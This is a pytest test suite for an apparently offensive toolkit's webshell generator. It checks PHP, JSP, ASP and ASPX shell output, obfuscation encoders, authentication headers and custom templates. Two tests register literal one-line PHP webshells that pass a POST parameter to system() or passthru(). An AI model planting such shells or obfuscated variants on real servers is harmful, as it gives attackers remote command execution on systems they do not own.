"""
Test suite for refactored webshells module.

Tests:
- Module structure and imports
- Template-based generation
- Authentication headers
- Custom templates
- Utility functions
- Backward compatibility
"""

import pytest

from ofx.api.exploitation.webshell import WebShell, generate_webshell
from ofx.api.exploitation.webshell.shell.asp import AspShell
from ofx.api.exploitation.webshell.shell.aspx import AspxShell
from ofx.api.exploitation.webshell.shell.jsp import JspShell
from ofx.api.exploitation.webshell.shell.php import PhpShell

class TestWebShellGeneration:
    """Test basic webshell generation"""

    def test_php_default(self):
        php = PhpShell(password="x")
        shell = php.get_webshell()
        assert "eval" in shell
        assert "x" in shell

    def test_php_base64(self):
        php = PhpShell(password="x", encoder="base64")
        shell = php.get_webshell()
        assert "base64_decode" in shell

    def test_php_chr(self):
        php = PhpShell(password="x", encoder="chr")
        shell = php.get_webshell()
        assert "chr" in shell

    def test_jsp_default(self):
        jsp = JspShell(password="cmd")
        shell = jsp.get_webshell()
        assert "Runtime.getRuntime()" in shell

    def test_asp_default(self):
        asp = AspShell(password="cmd")
        shell = asp.get_webshell()
        assert "WSCRIPT.SHELL" in shell

    def test_aspx_default(self):
        aspx = AspxShell(password="cmd")
        shell = aspx.get_webshell()
        assert "Process" in shell

    def test_php_obfuscated(self):
        php = PhpShell(password="x")
        shell = php.get_webshell(obfuscate=True)
        assert "eval" in shell or "base64" in shell

    def test_aspx_obfuscated(self):
        aspx = AspxShell(password="cmd")
        shell = aspx.get_webshell(obfuscate=True)
        assert "<%@ Page" in shell
        assert "Process" in shell or "System.Diagnostics" in shell

    def test_jsp_obfuscated(self):
        jsp = JspShell(password="cmd")
        shell = jsp.get_webshell(obfuscate=True)
        assert "<%@page" in shell
        assert "Base64" in shell or "runtime" not in shell.lower()

    def test_asp_obfuscated(self):
        asp = AspShell(password="cmd")
        shell = asp.get_webshell(obfuscate=True)
        assert "<%" in shell
        assert "Chr(" in shell or "Execute" in shell

class TestAuthentication:
    """Test authentication header support"""

    def test_php_with_auth(self):
        php = PhpShell(
            password="x",
            encoder="default",
            secret_header="X-Auth-Token",
            secret_value="secret123",
        )
        shell = php.get_webshell()
        assert "HTTP_X_AUTH_TOKEN" in shell
        assert "secret123" in shell

    def test_jsp_with_auth(self):
        jsp = JspShell(
            password="cmd",
            secret_header="Authorization",
            secret_value="Bearer token",
        )
        shell = jsp.get_webshell()
        assert "AUTHORIZATION" in shell
        assert "Bearer token" in shell

class TestCustomTemplates:
    """Test custom template system"""

    def test_register_custom_template(self):
        WebShell.register_custom_template(
            "php", '<?php system($_POST["{{PASSWORD}}"]);?>'
        )
        assert "php" in WebShell.list_custom_templates()
        WebShell.clear_custom_templates()

    def test_custom_template_usage(self):
        WebShell.register_custom_template(
            "php", '<?php passthru($_POST["{{PASSWORD}}"]);?>'
        )
        php = PhpShell(password="cmd")
        shell = php.get_webshell()
        assert "passthru" in shell
        assert "cmd" in shell
        WebShell.clear_custom_templates()

    def test_unregister_custom_template(self):
        WebShell.register_custom_template("php", "test")
        WebShell.unregister_custom_template("php")
        assert "php" not in WebShell.list_custom_templates()

class TestConvenienceFunction:
    """Test convenience function"""

    def test_generate_webshell_php(self):
        shell = generate_webshell("php", password="x", encoder="base64")
        assert "base64" in shell
        assert "x" in shell

    def test_generate_webshell_jsp(self):
        shell = generate_webshell("jsp", password="cmd")
        assert "Runtime" in shell

    def test_generate_webshell_with_auth(self):
        shell = generate_webshell(
            "php",
            password="x",
            secret_header="X-Token",
            secret_value="secret",
        )
        assert "HTTP_X_TOKEN" in shell
        assert "secret" in shell

class TestBackwardCompatibility:
    """Test backward compatibility with old API"""

    def test_old_php_api(self):
        php = PhpShell(password="pass", encoder="base64")
        shell = php.get_webshell()
        assert shell is not None
        assert "base64" in shell

    def test_old_jsp_api(self):
        jsp = JspShell(password="cmd")
        shell = jsp.get_webshell()
        assert shell is not None

    def test_old_generate_webshell(self):
        shell = generate_webshell("php", password="pass")
        assert shell is not None

class TestInlineMode:
    """Test inline mode (whitespace removal)"""

    def test_php_inline(self):
        php = PhpShell(password="x")
        shell = php.get_webshell(inline=True)
        assert "\n" not in shell
        assert "  " not in shell

if __name__ == "__main__":
    pytest.main([__file__, "-v"])
